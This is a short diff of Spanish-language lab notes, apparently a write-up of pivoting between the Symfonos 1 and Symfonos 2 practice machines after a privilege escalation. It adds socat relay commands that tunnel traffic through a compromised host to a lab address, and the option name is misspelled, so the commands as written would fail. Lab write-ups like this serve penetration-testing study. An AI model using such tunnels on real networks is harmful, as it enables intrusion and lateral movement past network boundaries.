@@ -492,7 +492,10 @@ explotando este binario logramos conseguir una bash con privilegios elevados
 
 > ./socat TCP-LISTN:1221,fork TCP:10.0.2.4:9001
 
-#Nota: para hacerlo de manera inversa, es decir. hacer una peticion desde la maquina atacante la
+#Nota: para hacerlo de manera inversa, es decir. hacer una peticion a la symfonos-2 pasando por la maquina symfonos 1 debemos configurar otro tunel de socat de la siguiente manera:
+
+./socat TCP-LISTN:1331,fork TCP:10.0.2.4:9001
+
 ```
 
 [GraficoPivoting](obsidian://open?vault=ObsidianGIT&file=Excalidraw%2FPivoting.excalidraw) 
